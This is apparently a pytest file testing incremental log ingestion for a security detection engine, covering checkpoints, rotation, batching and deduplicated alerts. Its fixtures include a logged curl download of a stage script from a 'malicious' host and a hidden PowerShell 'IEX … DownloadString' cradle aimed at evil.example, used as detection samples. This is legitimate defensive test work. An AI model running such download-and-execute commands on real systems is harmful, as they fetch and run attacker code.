"""
Tests for bounded incremental ingestion: checkpoints, tailing, rotation,
batching, and idempotent restart-safe writes.
"""
import os
import tempfile

import pytest

from collectors.linux.collector import LinuxCollector
from collectors.windows.collector import WindowsCollector
from core.correlator import Correlator, load_chain_rules
from core.database import AlertDatabase
from core.engine import DetectionEngine
from core.ingest import (
    Checkpoint,
    CheckpointStore,
    IngestionService,
    chunked,
    linux_auditd_parser,
    normalize_parse_result,
    read_new_text,
    windows_sysmon_parser,
)
from core.rule_loader import RuleLoader

# One complete auditd event group (malicious curl download) as raw lines.
# uid 1000 (not root) so the LNX-001 root whitelist does not suppress it.
CURL_EVENT = (
    'type=SYSCALL msg=audit({ts}:{sid}): arch=c000003e syscall=59 success=yes '
    'exit=0 ppid=1234 pid={pid} auid=1000 uid=1000 gid=1000 euid=1000 tty=pts0 '
    'ses=1 comm="curl" exe="/usr/bin/curl" key=(null)\n'
    'type=EXECVE msg=audit({ts}:{sid}): argc=3 a0="curl" a1="-s" '
    'a2="http://malicious-site.com/{payload}.sh"\n'
    'type=CWD msg=audit({ts}:{sid}): cwd="/home/user"\n'
)


def curl_event(ts, sid, pid):
    # Vary the URL so each event has a distinct fingerprint (pid alone is
    # not part of the dedup fingerprint).
    return CURL_EVENT.format(ts=ts, sid=sid, pid=pid, payload=f"stage{sid}")


# Minimal Sysmon Event ID 1 (process creation) for a PowerShell cradle.
SYSMON_EVENT = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2025-01-15T11:05:0{n}.000000Z" />
    <Computer>WORKSTATION01</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2025-01-15 11:05:0{n}.000</Data>
    <Data Name="ProcessId">0x{pid}</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/stage{n}.ps1')"</Data>
    <Data Name="User">WORKSTATION01\\victim</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="ParentProcessId">0x1abc</Data>
  </EventData>
</Event>
"""


def sysmon_event(n, pid):
    return SYSMON_EVENT.format(n=n, pid=pid)


@pytest.fixture
def temp_db():
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        path = f.name
    try:
        yield AlertDatabase(path)
    finally:
        os.unlink(path)


@pytest.fixture
def service(temp_db):
    engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
    parser = linux_auditd_parser(LinuxCollector())
    correlator = Correlator(load_chain_rules())
    return IngestionService(
        temp_db, engine, parser, correlator=correlator, batch_size=10
    )


@pytest.fixture
def logfile():
    with tempfile.NamedTemporaryFile(
        suffix=".log", delete=False, mode="w"
    ) as f:
        path = f.name
    try:
        yield path
    finally:
        os.unlink(path)


class TestChunked:
    def test_bounded_batches(self):
        batches = list(chunked(range(25), 10))
        assert [len(b) for b in batches] == [10, 10, 5]

    def test_empty(self):
        assert list(chunked([], 10)) == []

    def test_invalid_size(self):
        with pytest.raises(ValueError):
            list(chunked([1, 2], 0))


class TestNormalizeParseResult:
    def test_bare_list_consumes_all(self):
        events, consumed = normalize_parse_result(["a", "b"], "hello")
        assert events == ["a", "b"]
        assert consumed == len("hello")

    def test_tuple_passthrough_clamped(self):
        events, consumed = normalize_parse_result((["a"], 3), "hello")
        assert consumed == 3
        # consumed is clamped to text length
        _, clamped = normalize_parse_result((["a"], 999), "hi")
        assert clamped == 2


class TestReadNewText:
    def test_reads_only_complete_lines(self, logfile):
        with open(logfile, "w") as f:
            f.write("line1\nline2\npartial")
        result = read_new_text(logfile, Checkpoint(source=logfile))
        assert result["text"] == "line1\nline2\n"
        # Offset stops before the partial line
        assert result["new_offset"] == len("line1\nline2\n")

    def test_incremental_reads_from_offset(self, logfile):
        with open(logfile, "w") as f:
            f.write("a\nb\n")
        first = read_new_text(logfile, Checkpoint(source=logfile))
        cp = Checkpoint(
            source=logfile, offset=first["new_offset"],
            inode=first["inode"], size=first["size"],
        )
        with open(logfile, "a") as f:
            f.write("c\n")
        second = read_new_text(logfile, cp)
        assert second["text"] == "c\n"
        assert second["reset"] is False

    def test_multibyte_utf8_offset_is_exact(self, logfile):
        # A command line with multibyte UTF-8 must not corrupt offset math.
        # Byte offset of the first line must equal its encoded length.
        line1 = 'comm="café" arg="naïve"\n'
        line2 = 'comm="second"\n'
        with open(logfile, "w", encoding="utf-8") as f:
            f.write(line1 + line2)
        first = read_new_text(logfile, Checkpoint(source=logfile))
        assert first["text"] == line1 + line2
        assert first["new_offset"] == len((line1 + line2).encode("utf-8"))

        # Resume after only the first line's byte length yields line2 exactly.
        cp = Checkpoint(
            source=logfile, offset=len(line1.encode("utf-8")),
            inode=first["inode"], size=first["size"],
        )
        second = read_new_text(logfile, cp)
        assert second["text"] == line2

    def test_truncation_resets(self, logfile):
        with open(logfile, "w") as f:
            f.write("aaaa\nbbbb\n")
        r = read_new_text(logfile, Checkpoint(source=logfile))
        cp = Checkpoint(
            source=logfile, offset=r["new_offset"],
            inode=r["inode"], size=r["size"],
        )
        # Truncate below the recorded offset
        with open(logfile, "w") as f:
            f.write("x\n")
        result = read_new_text(logfile, cp)
        assert result["reset"] is True
        assert result["text"] == "x\n"


class TestCheckpointStore:
    def test_roundtrip(self, temp_db):
        store = CheckpointStore(temp_db)
        assert store.load("src").offset == 0  # fresh
        store.save(Checkpoint(source="src", offset=42, inode=7, size=100, events_ingested=3))
        loaded = store.load("src")
        assert loaded.offset == 42
        assert loaded.inode == 7
        assert loaded.events_ingested == 3

    def test_upsert(self, temp_db):
        store = CheckpointStore(temp_db)
        store.save(Checkpoint(source="src", offset=10))
        store.save(Checkpoint(source="src", offset=20))
        assert store.load("src").offset == 20


class TestIngestionService:
    def test_first_ingest_generates_alerts(self, service, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        summary = service.ingest_file(logfile)
        assert summary["events_processed"] == 1
        assert summary["alerts_new"] == 1
        assert summary["end_offset"] > 0

    def test_second_ingest_only_new_content(self, service, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        service.ingest_file(logfile)

        # Append a second, distinct event
        with open(logfile, "a") as f:
            f.write(curl_event(1642253500.2, 1002, 5679))
        summary = service.ingest_file(logfile)
        assert summary["events_processed"] == 1  # only the new event
        assert summary["alerts_new"] == 1

    def test_reingest_without_new_content_is_noop(self, service, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        service.ingest_file(logfile)
        summary = service.ingest_file(logfile)
        assert summary["events_processed"] == 0
        assert summary["alerts_new"] == 0

    def test_restart_from_checkpoint_is_idempotent(self, temp_db, logfile):
        # A fresh service (simulating a restart) resumes at the stored
        # checkpoint and does not reprocess committed events.
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))

        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())

        svc1 = IngestionService(temp_db, engine, parser, batch_size=10)
        svc1.ingest_file(logfile)

        svc2 = IngestionService(temp_db, engine, parser, batch_size=10)
        summary = svc2.ingest_file(logfile)
        assert summary["events_processed"] == 0
        assert summary["start_offset"] == summary["end_offset"]

    def test_idempotent_writes_on_forced_reprocess(self, temp_db, logfile):
        # Even if the same content is reprocessed from offset 0 (checkpoint
        # lost), fingerprint dedup prevents duplicate alert rows.
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())

        svc = IngestionService(temp_db, engine, parser, batch_size=10)
        svc.ingest_file(logfile)
        first_count = len(temp_db.get_alerts(limit=1000))

        # Wipe the checkpoint to force a full reprocess
        temp_db.connection.execute("DELETE FROM ingest_checkpoints")
        temp_db.connection.commit()
        summary = svc.ingest_file(logfile)
        assert summary["alerts_new"] == 0
        assert summary["alerts_duplicate"] == 1
        assert len(temp_db.get_alerts(limit=1000)) == first_count

    def test_bounded_batches_cover_all_events(self, temp_db, logfile):
        # 25 distinct events with batch_size 10 => 3 batches, all processed.
        with open(logfile, "w") as f:
            for i in range(25):
                f.write(curl_event(1642253400.0 + i, 2000 + i, 6000 + i))
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())
        svc = IngestionService(temp_db, engine, parser, batch_size=10)
        summary = svc.ingest_file(logfile)
        assert summary["events_processed"] == 25
        assert summary["batches"] == 3
        assert summary["alerts_new"] == 25

    def _win_service(self, temp_db, batch_size=10):
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = windows_sysmon_parser(WindowsCollector())
        return IngestionService(temp_db, engine, parser, batch_size=batch_size)

    def test_windows_multi_event_ingest(self, temp_db, logfile):
        with open(logfile, "w") as f:
            f.write(sysmon_event(1, "aa01"))
            f.write(sysmon_event(2, "aa02"))
        summary = self._win_service(temp_db).ingest_file(logfile)
        assert summary["events_processed"] == 2
        assert summary["alerts_new"] == 2

    def test_windows_partial_trailing_element_held_back(self, temp_db, logfile):
        # Write two complete events plus the opening of a third (no </Event>).
        full = sysmon_event(1, "bb01") + sysmon_event(2, "bb02")
        partial = sysmon_event(3, "bb03")
        partial_open = partial[: partial.index("</Event>")]
        with open(logfile, "w") as f:
            f.write(full + partial_open)

        svc = self._win_service(temp_db)
        first = svc.ingest_file(logfile)
        assert first["events_processed"] == 2  # third held back
        # Offset stops exactly at the end of the last complete </Event>,
        # before the trailing newline and the partial third element.
        expected = full.rindex("</Event>") + len("</Event>")
        assert first["end_offset"] == expected

        # Complete the third event; only it is processed on the next run.
        with open(logfile, "w") as f:
            f.write(full + partial)
        second = svc.ingest_file(logfile)
        assert second["events_processed"] == 1
        assert second["alerts_new"] == 1

    def test_windows_reingest_noop(self, temp_db, logfile):
        with open(logfile, "w") as f:
            f.write(sysmon_event(1, "cc01"))
        svc = self._win_service(temp_db)
        svc.ingest_file(logfile)
        assert svc.ingest_file(logfile)["events_processed"] == 0

    def test_rotation_restarts_and_reprocesses(self, temp_db, logfile):
        with open(logfile, "w") as f:
            f.write(curl_event(1642253400.1, 1001, 5678))
        engine = DetectionEngine(RuleLoader().load_rules_directory("rules"))
        parser = linux_auditd_parser(LinuxCollector())
        svc = IngestionService(temp_db, engine, parser, batch_size=10)
        svc.ingest_file(logfile)

        # Simulate rotation: replace file content with a smaller new event.
        os.unlink(logfile)
        with open(logfile, "w") as f:
            f.write(curl_event(1642260000.9, 9001, 7000))
        summary = svc.ingest_file(logfile)
        assert summary["reset"] is True
        assert summary["events_processed"] == 1
